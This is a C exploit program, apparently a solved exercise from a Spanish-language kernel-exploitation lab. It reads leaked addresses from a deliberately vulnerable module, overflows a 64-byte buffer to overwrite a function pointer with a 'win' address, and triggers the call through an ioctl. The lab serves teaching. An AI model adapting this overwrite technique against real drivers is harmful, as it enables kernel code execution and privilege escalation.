#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>

#include "../funptr/funptr_ioctl.h"

#define DEVICE_PATH "/dev/funptr_lab"
#define BUF_SIZE 64

int main(void)
{
    int fd;
    char info[128];
    ssize_t r;

    fd = open(DEVICE_PATH, O_RDWR);
    if (fd == -1) {
        perror("open");
        return 1;
    }

    /*
     * Leer la información filtrada por el módulo.
     */
    r = read(fd, info, sizeof(info) - 1);
    if (r <= 0) {
        perror("read");
        close(fd);
        return 1;
    }

    info[r] = '\0';

    printf("Información recibida del módulo:\n%s\n", info);

    unsigned long handler_addr = 0;
    unsigned long win_addr = 0;

    /*
     * TODO 1:
     *
     * Parsear info con sscanf.
     *
     * Debes extraer handler_addr y win_addr.
     *
     * Recuerda usar %lx para hexadecimal.
     */

    int parsed;

    parsed = sscanf(info,
                "handler=%lx win=%lx",
                &handler_addr,
                &win_addr);

    if (parsed != 2) {
        fprintf(stderr, "Formato inesperado\n");
        close(fd);
        return 1;
    }

    if (handler_addr == 0 || win_addr == 0) {
        fprintf(stderr, "No se pudieron obtener las direcciones\n");
        close(fd);
        return 1;
    }

    printf("handler=0x%lx\n", handler_addr);
    printf("win=0x%lx\n", win_addr);

    char payload[BUF_SIZE + sizeof(uint64_t)];

    /*
     * TODO 2:
     *
     * Llenar los primeros BUF_SIZE bytes del payload con 'A'.
     */

    memset(payload, 'A' , BUF_SIZE);

    /*
     * TODO 3:
     *
     * Copiar la dirección de win_handler en el payload,
     * justo después de los 64 bytes de relleno.
     *
     * Debe ser binario, no texto.
     *
     * Usa uint64_t y memcpy.
     */

    uint64_t target;

    target = (uint64_t)win_addr;

    memcpy(payload + BUF_SIZE, &target, sizeof(target));

    ssize_t w;

    w = write(fd, payload, sizeof(payload));
    if (w != (ssize_t)sizeof(payload)) {
        perror("write");
        close(fd);
        return 1;
    }

    printf("Payload enviado: %zu bytes\n", sizeof(payload));

    if (ioctl(fd, FUNPTR_CALL) == -1) {
        perror("ioctl");
        close(fd);
        return 1;
    }

    printf("FUNPTR_CALL ejecutado. Revisa dmesg.\n");

    close(fd);

    return 0;
}